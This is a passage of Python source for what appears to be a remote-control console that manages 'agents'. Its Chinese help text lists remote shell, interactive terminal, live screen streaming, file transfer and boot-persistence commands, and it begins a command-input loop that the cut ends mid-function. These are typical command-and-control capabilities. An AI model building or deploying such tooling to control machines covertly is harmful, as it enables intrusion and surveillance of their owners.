  sessions                 列出所有 agent
  use <id>                 切换活动 agent
  info                     系统信息
  shell <cmd>              单条远程命令
  term                     交互式 shell
  screen on [fps]          开实时屏幕流 (默认 4fps)
  screen off               关屏幕流
  dl <remote> <local>      从 agent 下载文件
  ul <local> <remote>      向 agent 上传文件
  persist                  安装开机自启
  ping                     探活
  kill                     结束 agent 连接
  help / quit              帮助 / 退出控制台"""


def cmd_loop():
    global ACTIVE, VIEW_ON
    print(HELP)
    while True:
        try:
            line = input("ctl> ").strip()
        except EOFError:
            break
        except KeyboardInterrupt:
            print()
            continue
        if not line:
            continue
        try:
            parts = shlex.split(line)
        except ValueError as e:
